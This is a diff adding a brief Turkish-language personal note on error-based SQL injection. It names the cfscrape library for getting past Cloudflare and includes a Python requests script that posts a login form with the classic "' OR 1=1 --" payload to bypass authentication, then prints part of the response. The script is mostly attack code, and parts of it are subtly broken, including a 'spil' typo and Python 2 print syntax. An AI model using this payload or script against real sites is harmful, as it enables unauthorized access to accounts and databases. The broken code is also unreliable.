@@ -1,0 +1,19 @@
+error based sql injeciton ->
+cfscrape-> kütüphanesi: cfscrape.create_scraper()->
+
+bir sql gönderen python kodu yazdı
+
+import requests
+url ='site'
+s= requests.Session()
+data={
+"email":"' OR 1=1 --",
+"password":"anything"
+}
+r = s.post(url, data= data)
+print '\n'.join(r.text.spil('\n')[175:175+18])
+s.close()
+burada kolonlarda hata veriyodu colon isimlerinde email password yazan kısımda sql varmış
+
+
+
